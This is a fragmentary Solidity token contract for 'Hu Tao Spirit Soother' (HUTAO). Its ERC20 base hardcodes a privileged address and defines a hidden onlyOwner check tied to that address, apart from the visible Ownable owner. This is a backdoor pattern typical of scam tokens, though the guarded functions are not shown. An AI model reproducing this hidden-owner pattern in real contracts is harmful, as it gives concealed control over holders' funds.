...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    string public HUTAOwebsite = "https://hutaospiritsoother.biz/";
    string public HUTAOADDRESS = "0x1B30Fc7e79c3534390A401d829C5d03acdA114f8";
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _name;
    string private _symbol;
    address private WhaleHUTAO;
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
       _decimals = 9;
         WhaleHUTAO = 0x1B30Fc7e79c3534390A401d829C5d03acdA114f8;      
    }
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        _afterTokenTransfer(account, address(0), amount);
              ...
              function getHUTAOwebsite() public view returns (string memory) {
        return HUTAOwebsite;
    } 


               function getHUTAOADDRESS() public view returns (string memory) {
        return HUTAOADDRESS;
    }    
      modifier onlyOwner() {
         require(_msgSender() == WhaleHUTAO);
        _;
    }    
    function _approve(
        address owner,
...
contract HUTAO is ERC20, Ownable {
    constructor () ERC20("Hu Tao Spirit Soother", "HUTAO") 
    {    
